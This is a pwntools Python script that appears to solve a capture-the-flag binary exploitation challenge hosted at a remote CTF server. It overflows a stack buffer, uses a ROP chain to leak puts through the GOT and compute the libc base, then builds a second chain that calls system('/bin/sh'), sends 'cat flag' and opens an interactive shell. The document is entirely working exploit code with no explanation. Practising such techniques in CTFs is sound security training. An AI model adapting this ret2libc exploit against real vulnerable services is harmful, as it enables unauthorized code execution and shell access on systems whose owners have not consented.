from pwn import *

context(log_level="debug", arch="amd64", os="linux")
io = process("./pwn")
io=remote("node1.tgctf.woooo.tech",30139)
elf = ELF("./pwn")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]
main_addr = elf.symbols["main"]

io.recv()
payload = b"a" * (0x70 + 8)
payload += p64(next(elf.search(asm("pop rdi; ret;"), executable=True)))
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main_addr)
io.sendline(payload)

libc.address = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00")) - libc.sym["puts"]
info("libc base: " + hex(libc.address))

io.recv()
payload = b"a" * (0x70 + 8)
payload += p64(next(elf.search(asm("pop rdi; ret;"), executable=True)))
payload += p64(next(libc.search(b"/bin/sh")))
payload += p64(next(elf.search(asm("ret;"), executable=True)))
payload += p64(libc.sym["system"])
io.sendline(payload)
io.sendline(b'cat flag')
io.interactive()